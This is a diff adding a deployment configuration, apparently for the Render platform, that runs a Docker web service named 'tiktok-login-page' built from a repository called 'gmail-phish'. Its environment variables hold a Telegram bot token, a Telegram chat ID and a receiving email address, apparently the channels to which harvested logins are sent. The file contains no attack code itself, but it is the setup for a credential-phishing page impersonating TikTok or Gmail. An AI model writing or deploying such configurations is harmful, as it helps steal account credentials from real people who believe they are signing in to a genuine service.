@@ -1,0 +1,13 @@
+services:
+  - type: web
+    name: tiktok-login-page
+    runtime: docker
+    repo: https://github.com/davidmassmutual/gmail-phish.git
+    dockerfilePath: ./Dockerfile
+    envVars:
+      - key: TELEGRAM_BOT_TOKEN
+        sync: false
+      - key: TELEGRAM_CHAT_ID
+        sync: false
+      - key: RECEIVE_EMAIL
+        sync: false
